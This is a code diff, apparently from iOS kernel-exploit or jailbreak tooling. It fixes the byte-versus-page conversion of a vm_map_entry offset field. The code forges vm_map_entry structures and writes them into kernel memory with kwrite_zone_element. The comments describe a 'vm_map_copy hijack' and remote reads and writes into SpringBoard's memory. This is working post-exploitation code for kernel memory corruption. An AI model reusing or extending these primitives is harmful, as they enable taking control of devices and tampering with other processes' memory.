@@ -128,22 +128,20 @@ uint64_t vm_pack_pointer(uint64_t ptr, struct VmPackingParams *params)
     return 0;
 }
 
-// vme_offset is a 52-bit field sharing a word with vme_alias:12, and it holds a
-// BYTE offset into the vm_object. struct vm_map_entry in remote/VM.h declares it
-// as `unsigned long long vme_offset : 52`, so reading it through the bitfield
-// already yields the final value -- no conversion.
+// vme_offset is page-denominated. 31cfbe17 changed this to a pass-through
+// "byte" interpretation and that was WRONG. The moment 7c0f1f87 made the
+// vm_map_copy hijack actually land, the device kernel panicked immediately --
+// which is the falsification condition 31cfbe17 itself predicted. A byte offset
+// such as 0x1cc000 interpreted as a page number is astronomically out of range,
+// and that is what broke vm_page_insert_internal.
 //
-// This used to be "raw << 12", which inflated every real object offset by 4096.
-// The proof is in this file's own history: the old comment about the abandoned
-// Cyanide mapping path records "off=0x11cc000 into object size=0x4000". A 0x4000
-// object is 4 pages, so its only possible offsets are 0x0/0x1000/0x2000/0x3000 --
-// 0x11cc000 cannot come from a page-denominated offset. It is a byte offset that
-// got multiplied by 4096. That wrong offset is what made the page remap select
-// the wrong page of the target object, so remote_read() returned unrelated bytes
-// and remote_write() was invisible to the target.
+// Restored to the symmetric pair the author originally had, which is only now
+// reachable because nextAddr is the real backing entry:
+//     read : bytes = pages << 12
+//     write: pages = bytes >> 12
 uint64_t VME_OFFSET(uint64_t vme_offset_raw)
 {
-    return vme_offset_raw;
+    return vme_offset_raw << 12;
 }
 
 struct VMObject vm_get_object(uint64_t map, uint64_t address)
@@ -298,21 +296,11 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
     BOOL bumpedRef = YES;
 
     entry.vme_object_or_delta = (uint32_t)packedPointer;
-    // vme_offset is vm_object_offset_t, i.e. BYTES, and it is a 52-bit field
-    // sharing its 64-bit word with vme_alias:12 (struct vm_map_entry in
-    // remote/VM.h). XNU consumes it as a byte offset:
-    //     *offset = address - links.start + VME_OFFSET(entry);
-    // and vm_get_object() above already produced object->entryOffset in bytes,
-    // which the objectSize bounds check above also treats as bytes.
-    //
-    // This used to be "pageObjectOffset >> 12", shrinking the offset by 4096
-    // and pointing the local alias at the wrong page of the target object.
-    // Symptom on device (2026-09-26 10:08, commit 1a57b03d): reads of
-    // SpringBoard main's stack slot came back as ASCII junk
-    // (sb_via_bounce=0x63696c7070414955 == "UIAplic"), and writes were
-    // invisible, so remote_writeStr() never reached the buffer and
-    // objc_getClass() returned 0.
-    entry.vme_offset = pageObjectOffset;
+    // vme_offset is page-denominated, so convert the byte offset down. 31cfbe17
+    // removed this shift on the theory that the field holds bytes; the kernel
+    // panic on 2026-09-26 falsified that. See VME_OFFSET() above. This pair must
+    // stay symmetric with the read path or the remap selects a nonsense page.
+    entry.vme_offset = pageObjectOffset >> 12;
 
     // Exclusive: concurrent kwrite_zone_element raced XNU RW lock → panic.
     kwrite_zone_element(nextAddr, &entry, sizeof(struct vm_map_entry));
